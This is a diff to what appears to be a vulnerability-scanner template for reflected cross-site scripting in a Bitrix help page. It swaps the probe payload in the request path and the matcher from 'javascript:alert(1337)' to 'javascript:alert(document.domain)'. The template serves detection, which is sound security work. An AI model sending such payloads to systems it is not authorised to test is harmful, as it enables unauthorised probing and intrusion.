@@ -9,13 +9,13 @@ info:
 requests:
   - method: GET
     path:
-      - "{{BaseURL}}/bitrix/help/en/index.html?page=javascript:alert(1337)//"
+      - "{{BaseURL}}/bitrix/help/en/index.html?page=javascript:alert(document.domain)//"
 
     matchers-condition: and
     matchers:
       - type: word
         words:
-          - "javascript:alert(1337)"
+          - "javascript:alert(document.domain)"
         part: body
 
       - type: status
